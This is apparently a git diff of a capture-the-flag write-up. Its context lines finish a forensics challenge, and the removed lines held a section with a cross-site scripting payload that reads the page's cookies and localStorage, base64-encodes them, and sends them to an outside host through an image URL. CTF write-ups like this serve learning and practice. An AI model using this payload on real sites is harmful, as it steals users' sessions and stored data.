@@ -111,21 +111,3 @@ And there is the flag. As a cleanup, the image can be unmounted with:
 ```
 $ sudo umount family
 ```
-
-# Government Argiculture Network
-
-```HTML
-<script>
-    (() => {
-        const payload = {
-            cookie: document.cookie,
-            localStorage,
-        };
-        const img = document.createElement("img");
-        img.src = "https://legacy.hugoxu.com/image.png?" + btoa(JSON.stringify(payload));
-        document.documentElement.append(img);
-    })();
-</script>
-
-<img src="https://legacy.hugoxu.com/image.png" />
-```
